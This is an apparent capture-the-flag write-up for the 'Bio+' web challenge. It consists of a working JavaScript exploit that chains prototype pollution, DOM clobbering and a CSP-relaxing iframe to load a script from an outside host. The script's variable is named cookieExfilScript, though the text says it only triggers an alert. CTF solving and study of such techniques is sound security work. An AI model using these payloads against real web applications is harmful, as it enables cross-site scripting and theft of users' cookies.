# Bio+

### Exploit

Execute the following code from the challenge page (i.e. Devtools) to get a Bio page which triggers an alert.

```
// https://biohazard-web.2023.ctfcompetition.com
const challengeOrigin = window.origin;
const cookieExfilScript = 'https://attack.shhnjk.com/alert.js';

const firstResponse = await fetch('/create', {
  method:'POST',
  headers: {
    "Content-Type": "application/json",
  },
  body: `{"name":"test","introduction":"<a id=editor href=${cookieExfilScript}></a><a id=editor></a>","favorites":{"hobbies":"","sports":""}, "__proto__": {"* ID": true}}`
});
const firstBio = await firstResponse.json();

const secondResponse = await fetch('/create', {
  method:'POST',
  headers: {
    "Content-Type": "application/json",
  },
  body: `{"name":"test","introduction":"<iframe src=\\"${challengeOrigin}/views/view/${firstBio.id}\\" csp=\\"script-src ${cookieExfilScript} ${challengeOrigin}/static/closure-library/ ${challengeOrigin}/static/sanitizer.js ${challengeOrigin}/static/main.js 'unsafe-inline' 'unsafe-eval'\\"></iframe>","favorites":{"hobbies":"","sports":""}, "__proto__": {"* CSP": true}}`
});
const secondBio = await secondResponse.json();

location.href = `/view/${secondBio.id}`;
```
